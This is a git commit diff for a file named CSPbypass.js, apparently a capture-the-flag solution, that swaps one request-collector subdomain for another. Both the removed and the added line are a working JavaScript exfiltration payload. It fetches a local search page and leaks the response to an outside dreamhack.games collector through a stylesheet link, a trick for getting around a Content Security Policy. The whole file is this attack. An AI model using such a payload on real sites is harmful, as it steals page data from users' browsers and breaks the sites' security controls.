d4bb4c839e5de17428d1a5543e39a1cfb1e433d6
wornjss1002 <149930832+wornjss1002@users.noreply.github.com>
2025-10-16 19:20:33 +0900

    Update stylesheet URL in CSPbypass.js

--- CSPbypass.js
+++ CSPbypass.js
@@ -1,1 +1,1 @@
-fetch("http://127.0.0.1:5000/search?query=scpCTF").then(res=>res.text()).then(text=>{const l = document.createElement('link');l.rel='stylesheet';l.href='https://ktkhaev.request.dreamhack.games/?data='+ encodeURIComponent(text);document.head.appendChild(l);})
+fetch("http://127.0.0.1:5000/search?query=scpCTF").then(res=>res.text()).then(text=>{const l = document.createElement('link');l.rel='stylesheet';l.href='https://xcvzeme.request.dreamhack.games/?data='+ encodeURIComponent(text);document.head.appendChild(l);})
